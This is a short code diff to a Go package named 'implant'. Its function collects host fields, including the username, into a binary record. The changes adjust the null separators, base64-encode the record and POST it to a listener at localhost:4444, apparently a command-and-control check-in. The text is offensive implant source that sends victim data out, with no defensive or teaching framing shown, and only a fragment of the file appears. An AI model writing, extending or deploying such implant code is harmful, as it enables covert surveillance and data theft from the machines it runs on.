@@ -2,6 +2,7 @@ package implant
 
 import (
 	"bytes"
+	"encoding/base64"
 	"encoding/binary"
 	"fmt"
 	"net/http"
@@ -27,9 +28,13 @@ func Do() {
 		[]byte(user),
 	}
 	dataSection := []byte{}
+	c := 1
 	for _, field := range dataFields {
 		dataSection = append(dataSection, field...)
-		dataSection = append(dataSection, 0x00) // Null separator
+		if c < 3 {
+			dataSection = append(dataSection, 0x00) // Null separator
+			c+=1
+		}
 	}
 	dataLen := uint16(len(dataSection)) // 2 bytes
 
@@ -49,7 +54,10 @@ func Do() {
 	// === POST Request ===
 	url := "http://localhost:4444/"
 
-	resp, err := http.Post(url, "application/octet-stream", buf)
+	fmt.Println(dataSection)
+	p := base64.StdEncoding.EncodeToString(buf.Bytes())
+
+	resp, err := http.Post(url, "application/octet-stream", bytes.NewReader([]byte(p)))
 	if err != nil {
 		fmt.Println("POST request error:", err)
 		os.Exit(1)
